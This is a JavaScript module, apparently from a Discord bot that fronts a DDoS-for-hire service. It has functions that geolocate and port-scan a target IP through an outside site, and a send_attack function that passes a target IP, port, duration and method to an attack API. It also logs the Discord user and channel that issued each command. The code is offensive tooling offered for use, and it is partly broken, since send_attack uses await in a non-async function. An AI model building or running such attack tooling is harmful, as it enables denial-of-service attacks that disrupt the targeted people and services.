// Modules
const fs = require("fs");
const fetch = require("node-fetch");

// Files
const Config = require("../Config/main.js");
const C = require("../Config/current.js");
const Extra = require("./functions.js");

/*
*@param 1: IP Address
*@type: (Promise[<strig>])
*/
exports.geoIP = async function(ip) {
    let response = await (await fetch("https://scrapy.tech/geo.php?ip=" + ip)).text();
    return response;
}

/*
*@param 1: IP Address
*@type: (Promise[<strig>])
*/
exports.pScan = async function(ip) {
    let response = await (await fetch("https://scrapy.tech/pscan.php?ip=" + ip)).text();
    return response;
}

/*
*@type: (void)
*/
exports.log_console = function(status) {
    let output = "[CMD/MSG]: " + status + "\r\n" + "[User]: " + C.CurrentUser.Name + " | [UserID]: " + C.CurrentUser.UserID + "\r\n";
    output += "[Server]: " + C.CurrentRoom.Server + " | [ServerID]: " + C.CurrentRoom.ServerID + "\r\n";
    output += "[Channel]: " + C.CurrentRoom.Channel + " | [ChannelID]: " + C.CurrentRoom.ChannelID + "\r\n\r\n";
    console.log(output);
    Extra.log_to_file(output);
}

/*
*@params: IP Adress, Port, Time, Method
*@type: (Promise[<string>])
*/
exports.send_attack = function(ip, p, t, m) { 
    let response = await (await fetch(Config.API_1 + ip + "&port=" + p + "&time=" + t + "&type=" + m)).text();
    return "Attack sent";
}

/*
*@type: [<string>]
*/
exports.currentTime = function() {
    let current = new Date();
    return current.getMonth()+1 + "/" + current.getDate() + "/" + current.getFullYear();
}

/*
*@type: (void)
*/
exports.log_to_file = function(output) {
    fs.appendFileSync("./db/logs.db", output + "\r\n");
    return "[x] Added";
}

/*
*@params: discord_id, ip, port, time, method
*@type: (void)
*/
exports.log_attack = function(u, ip, p, t, m) {

}
